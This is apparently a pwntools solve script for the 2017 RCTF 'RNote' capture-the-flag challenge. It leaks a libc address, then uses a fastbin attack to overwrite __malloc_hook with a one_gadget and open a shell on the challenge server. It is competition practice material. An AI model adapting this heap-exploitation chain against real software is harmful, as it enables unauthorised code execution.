from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./2017_RCTF_RNote")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./2017_RCTF_RNote")
else:
	p = remote("111.198.29.45","30462")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./2017_RCTF_RNote")

def add(size,title,content):
	p.sendafter("Your choice: ","1")
	p.sendafter("size: ",str(size))
	p.sendafter("title: ",title)
	p.sendafter("content: ",content)

def show(index):
	p.sendafter("Your choice: ","3")
	p.sendafter("show: ",str(index))

def free(index):
	p.sendafter("Your choice: ","2")
	p.sendafter("delete: ",str(index))

def debugf():
	gdb.attach(p,"b *0x400EBA")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
add(0xf0,"\n","\n")
add(0x60,"\n","\n")
free(0)
add(0xf0,"\n","\n")
show(0)
p.recvuntil("note content: ")
p.recv(8)
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
"""
if debug:
	libc.address = leak_addr - 88 - 0x10 - libc.symbols["__malloc_hook"]
else:
	libc.address = leak_addr - 0x398b0a - 0x78 + 0xa"""
libc.address = leak_addr - 88 - 0x10 - libc.symbols["__malloc_hook"]
log.success("libc_base:" + hex(libc.address))
add(0x60,"\n","\n")
add(0x60,"a"*0x10 + "\x10","\n")
free(1)
free(2)
free(3)
target = libc.symbols["__malloc_hook"] - 0x23
add(0x60,"\n",p64(target) + "\n")
add(0x60,"\n","\n")
add(0x60,"\n","\n")
if debug:
	one_gadget = libc.address + 0xf1147
else:
	one_gadget = libc.address + 0xf1147
payload = "aaa" + p64(0) * 2 + p64(one_gadget)
add(0x60,"\n",payload)
p.sendafter("Your choice: ","1")
p.sendafter("size: ",str(0x10))
p.interactive()
